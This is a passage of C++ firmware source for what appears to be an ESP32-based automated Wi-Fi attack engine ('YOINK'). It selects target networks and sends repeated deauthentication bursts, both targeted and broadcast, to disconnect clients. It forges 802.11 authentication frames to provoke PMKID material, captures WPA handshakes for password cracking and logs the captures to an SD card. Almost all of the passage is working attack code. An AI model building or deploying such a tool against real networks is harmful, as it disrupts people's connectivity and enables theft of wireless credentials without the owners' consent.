    s_currentCh = s_networks[idx].channel;
    esp_wifi_set_channel(s_currentCh, WIFI_SECOND_CHAN_NONE);

    yoinkLog(1, "Target: %s (%02X:%02X:%02X:%02X:%02X:%02X) ch%d rssi=%d",
             s_targetSSID,
             s_targetBssid[0], s_targetBssid[1], s_targetBssid[2],
             s_targetBssid[3], s_targetBssid[4], s_targetBssid[5],
             s_currentCh, s_targetRSSI);

    s_networks[idx].attackAttempts++;

    changeState(YoinkState::LOCKING);
}

static void tickLocking(uint32_t now) {
    uint32_t elapsed = now - s_stateEnterMs;

    // Fast-track to ATTACKING if we discover clients quickly
    if (s_clientCount > 0 && elapsed >= YOINK_LOCK_MIN) {
        yoinkLog(0, "%d clients found, engaging attack", s_clientCount);
        changeState(YoinkState::ATTACKING);
        return;
    }

    // Bail if no clients after lock timeout
    if (elapsed >= YOINK_LOCK_MAX) {
        if (s_clientCount > 0) {
            changeState(YoinkState::ATTACKING);
        } else {
            // No clients, send broadcast deauth as last resort
            yoinkLog(2, "No clients found, trying broadcast deauth");
            static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            WSLBypasser::sendDeauthBurst(s_targetBssid, broadcast, 3);
            s_deauthCount += 3;

            // Move to waiting briefly for EAPOL responses
            changeState(YoinkState::WAITING);
        }
    }
}

static void tickAttacking(uint32_t now) {
    uint32_t elapsed = now - s_stateEnterMs;

    // Check if handshake completed during attack
    if (s_activeHsIdx >= 0 && s_activeHsIdx < s_handshakeCount) {
        if (s_handshakes[s_activeHsIdx].hasValidPair()) {
            yoinkLog(1, "Handshake captured during attack!");
            changeState(YoinkState::WAITING);
            return;
        }
    }

    // Send deauth bursts periodically
    if (now - s_lastDeauthMs >= YOINK_DEAUTH_INTERVAL) {
        s_lastDeauthMs = now;

        if (s_clientCount > 0) {
            // Targeted deauth to each known client
            for (uint8_t i = 0; i < s_clientCount && i < 5; i++) {
                WSLBypasser::sendDeauthBurst(s_targetBssid, s_clients[i].mac, YOINK_DEAUTH_COUNT);
                s_deauthCount += YOINK_DEAUTH_COUNT;
            }
        } else {
            // Broadcast deauth
            static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            WSLBypasser::sendDeauthFrame(s_targetBssid, broadcast, 7);
            s_deauthCount++;
        }
    }

    // Attack timeout
    if (elapsed >= YOINK_ATTACK_MAX) {
        yoinkLog(0, "Attack timeout, moving to WAITING");
        changeState(YoinkState::WAITING);
    }
}

static void tickWaiting(uint32_t now) {
    uint32_t elapsed = now - s_stateEnterMs;

    // Extended wait if M1 seen but M2 missing
    uint32_t waitTime = YOINK_WAIT_DURATION;
    if (s_activeHsIdx >= 0 && s_activeHsIdx < s_handshakeCount) {
        if (s_handshakes[s_activeHsIdx].hasM1() && !s_handshakes[s_activeHsIdx].hasM2()) {
            waitTime = YOINK_WAIT_EXTENDED;
        }
    }

    if (elapsed >= waitTime) {
        // Set cooldown on current target
        if (s_targetIdx >= 0 && s_targetIdx < s_networkCount) {
            s_networks[s_targetIdx].cooldownUntil = now + 30000;  // 30s cooldown
        }

        s_channelLocked = false;
        s_activeHsIdx = -1;
        changeState(YoinkState::NEXT_TARGET);
    }
}

static void tickBored(uint32_t now) {
    if (now - s_stateEnterMs >= YOINK_BORED_RETRY) {
        yoinkLog(0, "Bored timer expired, rescanning");
        s_channelLocked = false;
        changeState(YoinkState::SCANNING);
    }
}

// ============= Association Request =============

static void sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
    // Minimal (Open System) auth request to provoke M1 for PMKID extraction
    // Frame: Auth Request (subtype 0x0B) with auth algo = Open (0x0000)
    uint8_t pkt[128] __attribute__((aligned(4)));
    memset(pkt, 0, sizeof(pkt));

    uint16_t pos = 0;

    // Frame Control: Authentication (type=0, subtype=11=0xB0)
    pkt[pos++] = 0xB0;
    pkt[pos++] = 0x00;

    // Duration
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    // Addr1 = DA = BSSID
    memcpy(pkt + pos, bssid, 6); pos += 6;

    // Addr2 = SA = our MAC
    uint8_t myMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, myMac);
    memcpy(pkt + pos, myMac, 6); pos += 6;

    // Addr3 = BSSID
    memcpy(pkt + pos, bssid, 6); pos += 6;

    // Sequence control
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    // Auth Algorithm: Open System
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    // Auth Seq: 1
    pkt[pos++] = 0x01;
    pkt[pos++] = 0x00;

    // Status Code: Success
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x00;

    esp_wifi_80211_tx(WIFI_IF_STA, pkt, pos, false);
}

// ============= Public API Implementation =============

namespace YoinkEngine {

void init() {
    s_running = false;
    s_state = YoinkState::IDLE;
    s_packetCount = 0;
    s_deauthCount = 0;
    s_networkCount = 0;
    s_clientCount = 0;
    s_handshakeCount = 0;
    s_pmkidCount = 0;
    s_targetIdx = -1;
    s_activeHsIdx = -1;
    s_channelLocked = false;

    memset(s_pendingEapol, 0, sizeof(s_pendingEapol));
    memset(s_pendingBeacon, 0, sizeof(s_pendingBeacon));
    memset(s_pendingClient, 0, sizeof(s_pendingClient));

    yoinkLog(0, "Engine initialized");
    yoinkLog(0, "Memory: networks=%dB handshakes=%dB total=%dB",
            (int)sizeof(s_networks), (int)sizeof(s_handshakes),
            (int)(sizeof(s_networks) + sizeof(s_handshakes) + sizeof(s_pmkids) +
                  sizeof(s_clients) + sizeof(s_pendingEapol) +
                  sizeof(s_pendingBeacon) + sizeof(s_pendingClient)));
}

void start() {
#if defined(NEONDRIVE_TARGET_M5TAB5)
    neon_rf_set_last_action("yoink_start");
    yoinkLog(3, "start: BLOCKED on Tab5 (no local radio; C6 backend not yet implemented)");
    return;
#endif
    if (s_running) return;

    // Reset log ring
    s_logSeq = 0;
    s_logHead = 0;
    s_logCount = 0;
    memset(s_logRing, 0, sizeof(s_logRing));
    s_sessionStartMs = millis();

    // Start session log on SD (per-SSID Handshakes/ dirs are created on first save)
    if (!SD.exists("/captures")) SD.mkdir("/captures");
    File f = SD.open(YOINK_SESSION_LOG, FILE_WRITE);  // overwrite previous session
    if (f) {
        f.printf("=== YOINK Session Started ===\n");
        f.printf("Free heap: %u\n\n", ESP.getFreeHeap());
        f.close();
    }

    init();  // Clear all state
    startWifi();
    s_running = true;
    changeState(YoinkState::SCANNING);

    yoinkLog(1, "Engine started. Free heap: %u", ESP.getFreeHeap());
}

void stop() {
    if (!s_running) return;
    s_running = false;
    s_channelLocked = false;
    stopWifi();
    changeState(YoinkState::IDLE);
    yoinkLog(1, "Engine stopped. Captures: %d HS, %d PMKID",
            s_handshakeCount, s_pmkidCount);
}

void update() {
    if (!s_running) return;

    uint32_t now = millis();

    // 1. Drain deferred beacon events
    for (uint8_t i = 0; i < PENDING_BEACON_SLOTS; i++) {
        if (s_pendingBeacon[i].pending) {
            processBeaconEvent(s_pendingBeacon[i]);
            s_pendingBeacon[i].pending = false;
        }
    }

    // 2. Drain deferred client events
    for (uint8_t i = 0; i < PENDING_CLIENT_SLOTS; i++) {
        if (s_pendingClient[i].pending) {
            processClientEvent(s_pendingClient[i]);
            s_pendingClient[i].pending = false;
        }
    }

    // 3. Drain deferred EAPOL events
    for (uint8_t i = 0; i < PENDING_EAPOL_SLOTS; i++) {
        if (s_pendingEapol[i].pending) {
            processEapolEvent(s_pendingEapol[i]);
            s_pendingEapol[i].pending = false;
        }
    }

    // 4. State machine tick
    switch (s_state) {
        case YoinkState::SCANNING:      tickScanning(now); break;
        case YoinkState::PMKID_HUNTING: tickPmkidHunting(now); break;
        case YoinkState::NEXT_TARGET:   tickNextTarget(now); break;
        case YoinkState::LOCKING:       tickLocking(now); break;
        case YoinkState::ATTACKING:     tickAttacking(now); break;
        case YoinkState::WAITING:       tickWaiting(now); break;
        case YoinkState::BORED:         tickBored(now); break;
        default: break;
    }

    // 5. Periodic heap health check (every 10s)
    static uint32_t lastHeapMs = 0;
    if (now - lastHeapMs >= 10000) {
        lastHeapMs = now;
        yoinkLog(0, "Heap:%u nets=%d hs=%d pmk=%d cli=%d pkts=%u deauth=%u",
                ESP.getFreeHeap(),
                s_networkCount, s_handshakeCount, s_pmkidCount,
                s_clientCount, s_packetCount, s_deauthCount);
    }
}

bool isRunning() { return s_running; }

YoinkState getState() { return s_state; }

const char* getStateStr() {
    switch (s_state) {
        case YoinkState::IDLE:          return "IDLE";
        case YoinkState::SCANNING:      return "SCANNING";
        case YoinkState::PMKID_HUNTING: return "PMKID HUNT";
        case YoinkState::NEXT_TARGET:   return "TARGETING";
        case YoinkState::LOCKING:       return "LOCKING";
        case YoinkState::ATTACKING:     return "ATTACKING";
        case YoinkState::WAITING:       return "WAITING";
        case YoinkState::BORED:         return "IDLE";
        default:                        return "---";
    }
}

uint32_t getPacketCount() { return s_packetCount; }
uint32_t getDeauthCount() { return s_deauthCount; }
uint8_t  getNetworkCount() { return s_networkCount; }
uint8_t  getClientCount() { return s_clientCount; }
uint8_t  getHandshakeCount() {
    uint8_t count = 0;
    for (uint8_t i = 0; i < s_handshakeCount; i++) {
        if (s_handshakes[i].hasValidPair()) count++;
    }
    return count;
}
uint8_t  getPmkidCount() { return s_pmkidCount; }
uint8_t  getCurrentChannel() { return s_currentCh; }

const char* getTargetSSID() { return s_targetSSID; }
const uint8_t* getTargetBSSID() { return s_targetBssid; }
int8_t  getTargetRSSI() { return s_targetRSSI; }

uint8_t getEapolMask() {
    if (s_activeHsIdx >= 0 && s_activeHsIdx < s_handshakeCount) {
        return s_handshakes[s_activeHsIdx].capturedMask;
    }
    return 0;
}

const char* getTargetAuthStr() {
    if (s_targetIdx >= 0 && s_targetIdx < s_networkCount) {
        switch (s_networks[s_targetIdx].authmode) {
            case WIFI_AUTH_OPEN: return "OPEN";
            case WIFI_AUTH_WEP: return "WEP";
            case WIFI_AUTH_WPA_PSK: return "WPA";
            case WIFI_AUTH_WPA2_PSK: return "WPA2";
            case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
#if defined(WIFI_AUTH_WPA3_PSK)
            case WIFI_AUTH_WPA3_PSK: return "WPA3";
#endif
#if defined(WIFI_AUTH_WPA2_WPA3_PSK)
            case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
#endif
            default: return "???";
        }
    }
    return "---";
}

uint8_t getNetworkListCount() { return s_networkCount; }
const YoinkNetwork* getNetwork(uint8_t index) {
    if (index >= s_networkCount) return nullptr;
    return &s_networks[index];
}

const YoinkHandshake* getHandshake(uint8_t index) {
    if (index >= s_handshakeCount) return nullptr;
    return &s_handshakes[index];
}

const YoinkPmkid* getPmkid(uint8_t index) {
    if (index >= s_pmkidCount) return nullptr;
    return &s_pmkids[index];
}

uint8_t getTotalHandshakeSlots() { return s_handshakeCount; }

uint32_t getLogSeq() { return s_logSeq; }

uint8_t getLogCount() { return s_logCount; }

const YoinkLogEntry* getLogEntry(uint8_t ringIndex) {
    if (ringIndex >= s_logCount) return nullptr;
    // Ring buffer: oldest entry is at (head - count) mod size
    uint8_t realIdx = (s_logHead + YOINK_LOG_RING_SIZE - s_logCount + ringIndex) % YOINK_LOG_RING_SIZE;
    return &s_logRing[realIdx];
}

}  // namespace YoinkEngine
